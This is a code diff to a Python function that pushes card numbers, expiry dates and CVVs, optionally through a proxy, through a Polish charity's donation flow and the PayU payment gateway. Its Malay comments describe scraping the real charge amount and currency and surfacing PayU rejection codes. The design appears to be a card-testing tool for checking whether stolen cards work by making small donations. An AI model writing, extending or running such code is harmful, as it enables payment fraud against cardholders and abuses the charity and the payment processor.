@@ -138,9 +138,9 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
                 token = tok.group(1)
 
         if not order_id or not token:
-            return 'Failed to extract orderId or token', {}
+            return 'Failed to extract orderId or token', {"error": "Could not parse order from fundacjakukuczki.pl"}
 
-        # ─── Step 2: Load PayU pay page ───
+        # ─── Step 2: Load PayU pay page (DITAMBAH UNTUK DAPATKAN AMOUNT & CURRENCY SEBENAR) ───
         params2 = {
             'orderId': order_id,
             'token': token,
@@ -163,7 +163,23 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'user-agent': ua,
         }
 
-        session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
+        page_resp = session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
+        
+        # Cari amount dan currency sebenar dalam kod HTML laman pembayaran
+        final_amount = 100 # Default 1.00
+        final_currency = 'PLN' # Default Poland
+        
+        try:
+            html_content = page_resp.text
+            amt_match = re.search(r'"totalAmount"\s*:\s*"?(\d+)"?', html_content)
+            curr_match = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', html_content)
+            
+            if amt_match:
+                final_amount = int(amt_match.group(1))
+            if curr_match:
+                final_currency = curr_match.group(1)
+        except:
+            pass # Kalu tak jumpa, guna default je
 
         # ─── Step 3: Tokenize card ───
         headers3 = {
@@ -212,15 +228,15 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
                 return f'Tokenization failed: {error_msg}', token_data
             return f'Failed to tokenize card', token_data
 
-        # ─── Step 4: Submit payment ───
+        # ─── Step 4: Submit payment (MENGGUNAKAN DATA YANG DI-READ DARI HTML) ───
         masked = cc[:6] + '*' * 6 + cc[-4:]
 
         json4 = {
             'email': email,
             'firstName': name.split()[0] if ' ' in name else name,
             'lastName': name.split()[1] if ' ' in name else '',
-            'currency': 'PLN',
-            'amount': 100,
+            'currency': final_currency, # GUNA CURRENCY SEBENAR
+            'amount': final_amount,     # GUNA AMOUNT SEBENAR
             'payMethod': {
                 'type': 'c',
                 'token': card_token,
@@ -254,11 +270,12 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             except Exception:
                 pay_data = {"raw": r4.text, "status_code": r4.status_code}
 
-        continue_url = pay_data.get('continueUrl')
-        error_code = pay_data.get('errorCode')
+        # TAMBAHAN: Tangkap error tersembunyi dari PayU
+        if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
+            err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), dict) else str(pay_data.get('error', ''))
+            return f'PayU Rejected: {pay_data.get("errorCode")} - {err_desc}', pay_data
 
-        if error_code:
-            return f'Payment error: {error_code}', pay_data
+        continue_url = pay_data.get('continueUrl')
 
         # ─── Step 5: Poll for result ───
         if continue_url and 'threeds' in continue_url:
